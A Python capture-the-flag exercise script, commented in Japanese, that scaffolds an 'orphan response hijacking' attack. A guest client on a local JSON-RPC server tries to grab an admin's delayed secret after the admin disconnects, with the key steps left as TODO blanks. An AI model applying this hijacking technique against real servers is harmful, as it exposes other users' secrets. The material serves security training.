#!/usr/bin/env python3
"""
Challenge 1: Orphan Response Hijacking - 攻撃スクリプト（穴埋め式）

【目標】
admin ユーザーの秘密情報（FLAG{...}）を取得する

【状況】
- あなたは guest ユーザーとしてのみログインできる
- admin ユーザーの秘密情報を直接取得することはできない
- サーバーには脆弱性がある（ソースコードを読んで確認）

【ヒント】
- vulnerable_server.py を読んで脆弱性を理解しよう
- orphan response とは何かを考えよう
- サーバーが提供するメソッドをすべて確認しよう

【穴埋め箇所】
TODO コメントの部分を埋めて攻撃を完成させてください
"""

import json
import socket
import time
import threading
from typing import Any, Dict, Optional


class ExploitClient:
    """攻撃用クライアント"""

    def __init__(self, host: str = "127.0.0.1", port: int = 9999):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self._next_id = 1

    def connect(self):
        """サーバーに接続"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print(f"[*] サーバーに接続: {self.host}:{self.port}")

    def close(self):
        """接続を閉じる"""
        if self.sock:
            self.sock.close()
            self.sock = None

    def send_request(self, method: str, params: Dict[str, Any] = None) -> int:
        """リクエストを送信してIDを返す"""
        req_id = self._next_id
        self._next_id += 1

        request = {
            "jsonrpc": "2.0",
            "id": req_id,
            "method": method,
            "params": params or {}
        }

        message = json.dumps(request) + "\n"
        self.sock.sendall(message.encode("utf-8"))
        return req_id

    def recv_response(self, timeout: float = 5.0) -> Optional[Dict[str, Any]]:
        """レスポンスを受信"""
        self.sock.settimeout(timeout)
        try:
            data = self.sock.recv(4096)
            if data:
                return json.loads(data.decode("utf-8").strip())
        except socket.timeout:
            return None
        return None

    def request(self, method: str, params: Dict[str, Any] = None,
                timeout: float = 5.0) -> Optional[Dict[str, Any]]:
        """リクエストを送信してレスポンスを受信"""
        self.send_request(method, params)
        return self.recv_response(timeout)


def simulate_admin_activity(delay_before: float = 0.5):
    """
    admin ユーザーの活動をシミュレート

    実際の攻撃シナリオでは、admin が自分で操作している状況を想定
    このチャレンジでは、攻撃者が admin の活動をトリガーする
    """
    time.sleep(delay_before)

    admin_client = ExploitClient()
    admin_client.connect()

    # admin としてログイン
    admin_client.request("login", {"username": "admin"})
    print("[Admin] ログイン完了")

    # admin が自分の秘密を取得（遅延あり）
    # この遅延中にタイムアウトが発生すると...?
    print("[Admin] 秘密情報を取得中（遅延あり）...")
    admin_client.send_request("get_secret", {
        "delay_ms": 2000  # 2秒の遅延
    })

    # admin は待ちきれずに接続を切断
    time.sleep(0.3)
    print("[Admin] 待ちきれない！接続切断")
    admin_client.close()


def exploit():
    """
    攻撃を実行

    【攻撃の流れ】
    1. guest としてログイン
    2. admin の活動をトリガー（別スレッド）
    3. admin がタイムアウトで切断するのを待つ
    4. orphan response を取得
    5. FLAG を抽出
    """
    print("=" * 60)
    print("Challenge 1: Orphan Response Hijacking")
    print("=" * 60)
    print()

    # 攻撃者クライアント
    attacker = ExploitClient()
    attacker.connect()

    # ステップ1: guest としてログイン
    print("[*] ステップ1: guest としてログイン")
    resp = attacker.request("login", {"username": "guest"})
    if resp and resp.get("result", {}).get("success"):
        print("[+] ログイン成功")
    else:
        print("[-] ログイン失敗")
        return

    # ステップ2: admin の活動をシミュレート
    print()
    print("[*] ステップ2: admin の活動をトリガー")
    admin_thread = threading.Thread(target=simulate_admin_activity)
    admin_thread.start()

    # ステップ3: admin がタイムアウトするのを待つ
    print()
    print("[*] ステップ3: admin のタイムアウトを待機中...")

    # TODO: 適切な待機時間を設定（admin の遅延 + α）
    # ヒント: admin は 2000ms の遅延後にレスポンスを受け取るはず
    #        admin は 300ms で接続を切断する
    #        orphan が発生するタイミングを考えよう
    wait_time = 0  # ← ここを適切な値に変更
    time.sleep(wait_time)

    # ステップ4: orphan response を取得
    print()
    print("[*] ステップ4: orphan response を取得")

    # TODO: orphan を取得するメソッドを呼び出す
    # ヒント: vulnerable_server.py を読んで、orphan にアクセスできるメソッドを探そう
    resp = attacker.request("???", {})  # ← メソッド名を修正

    if resp is None:
        print("[-] レスポンスなし")
        attacker.close()
        return

    # ステップ5: FLAG を抽出
    print()
    print("[*] ステップ5: FLAG を抽出")

    # TODO: レスポンスから orphan データを取り出す
    # ヒント: レスポンスの構造を確認しよう（print(resp) でデバッグ）
    orphans = []  # ← ここを修正して orphans リストを取得

    print(f"[*] 取得した orphan 数: {len(orphans)}")

    # TODO: orphans から FLAG を抽出する
    # ヒント: orphan の中身を確認し、admin の秘密情報を探そう
    flag = None
    for orphan in orphans:
        # ここを実装
        # orphan のデータ構造を調べ、FLAG を探す
        pass

    if flag:
        print()
        print("=" * 60)
        print(f"[+] FLAG 発見: {flag}")
        print("=" * 60)
        print()
        print("おめでとうございます！攻撃成功です。")
    else:
        print("[-] FLAG が見つかりませんでした")
        print("[*] ヒント: orphan の中身を print() で確認してみよう")
        print(f"[*] デバッグ: resp = {resp}")

    admin_thread.join()
    attacker.close()


if __name__ == "__main__":
    exploit()
